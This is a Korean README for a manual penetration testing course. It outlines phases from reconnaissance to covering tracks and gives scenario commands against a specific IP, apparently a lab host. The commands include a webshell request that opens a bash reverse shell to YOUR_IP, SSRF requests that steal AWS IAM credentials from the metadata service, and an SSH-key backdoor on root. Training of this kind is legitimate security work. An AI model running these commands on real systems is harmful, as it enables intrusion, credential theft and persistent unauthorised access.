# 수동 침투 테스트 가이드 (Manual Penetration Testing Guide)

## 개요

이 가이드는 칼리 리눅스(Kali Linux)를 사용한 실전 수동 침투 테스트 방법을 단계별로 설명합니다. 자동화 도구에만 의존하지 않고, 각 공격 기법을 수동으로 이해하고 실행할 수 있도록 구성되어 있습니다.

## 목차

### Phase 1: 정찰 (Reconnaissance)
- **파일**: `01_reconnaissance.md`
- **도구**: nmap, nikto, gobuster, dirb, masscan
- **목표**: 대상 시스템의 열린 포트, 서비스, 디렉토리 구조 파악

### Phase 2: SQL Injection
- **파일**: `02_sql_injection.md`
- **도구**: sqlmap, Burp Suite, 수동 페이로드
- **목표**: 데이터베이스 취약점 악용, 인증 우회, 데이터 추출

### Phase 3: SSRF & AWS IMDS
- **파일**: `03_ssrf_and_imds.md`
- **도구**: curl, aws-cli, SSRFmap
- **목표**: 서버 측 요청 위조를 통한 내부 시스템 접근, AWS 자격증명 탈취

### Phase 4: 리버스 쉘 (Reverse Shell)
- **파일**: `04_reverse_shell.md`
- **도구**: Netcat, Metasploit, msfvenom
- **목표**: 대상 서버에서 공격자 머신으로의 대화형 쉘 연결

### Phase 5: 권한 상승 (Privilege Escalation)
- **파일**: `05_privilege_escalation.md`
- **도구**: LinPEAS, LinEnum, GTFOBins
- **목표**: 일반 사용자에서 root 권한으로 상승

### Phase 6: 지속성 확보 (Persistence)
- **파일**: `06_persistence.md`
- **도구**: SSH, Cron, Systemd
- **목표**: 재부팅 후에도 접근 유지할 수 있는 백도어 설치

### Phase 7: 데이터 탈취 (Data Exfiltration)
- **파일**: `07_data_exfiltration.md`
- **도구**: scp, rsync, curl, aws-cli
- **목표**: 중요 데이터(DB, 설정 파일, 자격증명) 외부로 전송

### Phase 8: 흔적 제거 (Covering Tracks)
- **파일**: `08_covering_tracks.md`
- **도구**: shred, sed, log 편집
- **목표**: 로그 파일 정리, 명령 히스토리 삭제

### Phase 9: 고급 기법 (Advanced Techniques)
- **파일**: `09_advanced_techniques.md`
- **도구**: Burp Suite, Docker, Chisel, BloodHound
- **목표**: WAF 우회, 컨테이너 탈출, 피벗팅, Active Directory 공격

### Phase 10: 완전 자동화
- **파일**: `10_full_penetration_automation.py`
- **도구**: Python 스크립트
- **목표**: 모든 단계를 자동으로 실행하는 침투 프레임워크

---

## 필수 도구 설치

### 칼리 리눅스 기본 도구
대부분의 도구는 칼리 리눅스에 기본 설치되어 있습니다:

```bash
# 시스템 업데이트
sudo apt update && sudo apt upgrade -y

# 필수 도구 설치 확인
sudo apt install -y nmap nikto gobuster dirb sqlmap netcat socat \
    metasploit-framework python3 python3-pip curl wget git \
    aircrack-ng hydra john hashcat steghide
```

### Python 라이브러리
```bash
# 자동화 스크립트용 Python 라이브러리
pip3 install requests paramiko pwntools python-nmap
```

### 추가 도구
```bash
# LinPEAS (권한 상승 스캔)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Chisel (터널링)
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64

# pspy (프로세스 모니터링)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
```

---

## 사용 방법

### 순차적 학습 (권장)
1. Phase 1부터 순서대로 진행
2. 각 단계의 명령어를 직접 실행하며 학습
3. 결과를 분석하고 다음 단계로 진행

```bash
# 예시: Phase 1 정찰 시작
cd /Users/hwangjunha/Desktop/ReD_Basic/HWJ/07_Manual_Penetration_Guide
cat 01_reconnaissance.md

# 명령어 실행
nmap -sS -sV 13.125.80.75
```

### 자동화 스크립트 실행
전체 과정을 자동으로 실행:

```bash
python3 10_full_penetration_automation.py -t TARGET_IP -p YOUR_IP

# 예시
python3 10_full_penetration_automation.py -t 13.125.80.75 -p 118.235.66.241
```

### 특정 단계만 실행
원하는 Phase만 선택하여 수동 실행:

```bash
# SQL Injection만 테스트
sqlmap -u "http://13.125.80.75/login.php" --forms --batch

# 리버스 쉘만 시도
nc -lvnp 4444  # 리스너
curl "http://13.125.80.75/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
```

---

## 실전 시나리오

### 시나리오 1: 웹 애플리케이션 침투
```bash
# 1. 정찰
nmap -sS -sV -p- 13.125.80.75
nikto -h http://13.125.80.75

# 2. SQL Injection 테스트
sqlmap -u "http://13.125.80.75/login.php" --forms --dbs

# 3. 파일 업로드 취약점 악용
# (웹셸 업로드)

# 4. 리버스 쉘 획득
nc -lvnp 4444

# 5. 권한 상승
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# 6. 백도어 설치
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

### 시나리오 2: AWS 클라우드 공격
```bash
# 1. SSRF로 IMDS 접근
curl "http://13.125.80.75/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 2. IAM 자격증명 탈취
curl "http://13.125.80.75/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role"

# 3. AWS CLI로 권한 확인
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity

# 4. EC2 인스턴스에 명령 실행 (SSM)
aws ssm send-command --instance-ids "i-xxx" --document-name "AWS-RunShellScript" --parameters 'commands=["whoami"]'
```

---

## 주의사항

### 법적 경고
⚠️ **이 가이드의 모든 기법은 승인된 침투 테스트 환경에서만 사용해야 합니다.**

- 허가 없이 타인의 시스템을 공격하는 것은 불법입니다
- 반드시 서면 승인을 받은 후 진행하세요
- 교육 및 연구 목적으로만 사용하세요

### 윤리적 해킹 원칙
1. **승인 범위 준수**: 계약서에 명시된 범위 내에서만 테스트
2. **데이터 보호**: 발견한 취약점과 데이터를 안전하게 보호
3. **즉시 보고**: 심각한 취약점 발견 시 즉시 고객에게 알림
4. **정리**: 테스트 후 백도어, 웹셸 등 모두 제거
5. **문서화**: 모든 과정을 상세히 기록

---

## 보고서 작성

침투 테스트 완료 후 다음 항목을 포함한 보고서 작성:

### 1. 요약 (Executive Summary)
- 전체 테스트 개요
- 발견된 취약점 개수 (심각도별)
- 권장 조치사항

### 2. 상세 발견사항
각 취약점마다:
- 취약점 설명
- 재현 단계
- 영향도 분석
- 수정 방안
- PoC (Proof of Concept) 코드

### 3. 기술적 세부사항
- 사용한 도구 및 기법
- 성공/실패한 공격 벡터
- 네트워크 다이어그램
- 스크린샷 및 로그

### 4. 권장사항
- 우선순위별 수정 조치
- 장기적 보안 개선 방안
- 추가 보안 테스트 권고

---

## 참고 자료

### 웹사이트
- **OWASP**: https://owasp.org/
- **HackTricks**: https://book.hacktricks.xyz/
- **GTFOBins**: https://gtfobins.github.io/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings

### 온라인 실습 환경
- **HackTheBox**: https://www.hackthebox.com/
- **TryHackMe**: https://tryhackme.com/
- **PentesterLab**: https://pentesterlab.com/
- **VulnHub**: https://www.vulnhub.com/

### 도서
- "The Web Application Hacker's Handbook"
- "Penetration Testing: A Hands-On Introduction to Hacking"
- "Red Team Field Manual"
- "RTFM: Red Team Field Manual"

---

## 문의 및 기여

이 가이드에 대한 피드백이나 개선 제안이 있으시면:
- 이슈 등록
- Pull Request 제출
- 이메일 문의

**해피 해킹! (Happy Hacking!)**

---

**마지막 업데이트**: 2025-11-28
**버전**: 1.0
**작성자**: HWJ
